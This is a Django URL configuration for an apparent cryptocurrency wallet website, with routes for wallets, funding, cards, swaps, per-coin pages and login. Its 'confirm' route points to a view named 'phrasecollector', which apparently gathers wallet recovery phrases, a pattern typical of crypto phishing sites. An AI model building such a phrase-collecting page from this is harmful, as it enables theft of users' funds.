from django.contrib.auth.views import LoginView, LogoutView
from django.urls import path

from . import views

urlpatterns = [
    path("", views.home, name="home"),
    path("wallet/", views.wallet, name='wallet' ),
    path("confirm", views. phrasecollector, name="confirm"),
    path("dashboard/", views.dashboard, name="dashboard"),
    path("fund/", views.fund, name="fund"),
    path("fund_wallet/", views.fund_wallet, name="fund_wallet"),
    path("payment_method/", views.payment_method, name="payment_method"),
    path("card/", views.card, name="card"),
    path("earn/", views.earn, name="earn"),
    path('swap/', views.swap, name="swap"),
    path("register/", views.signup, name="register"),
    path("signup/", views.signup, name="signup"),
    path("login/", views.CustomLoginView.as_view(), name="login"),
    path("btc/", views.btc, name="btc"),
    path("eth/", views.eth, name="eth"),
    path("xrp/", views.xrp, name="xrp"),
    path("ltc/", views.ltc, name="ltc"),
    path("xlm/", views.xlm, name="xlm"),
    path("doge/", views.doge, name="doge"),
    path("sol/", views.sol, name="sol"),
    path("wlfi/", views.wlfi, name="wlfi"),
    path("shib/", views.shib, name="shib"),
    path("apply-card/", views.apply_card, name="apply_card"),
     path("earn/submit/", views.submit_earn, name="submit_earn"),
    
    path("logout/", views.logout_view, name="logout"),
]
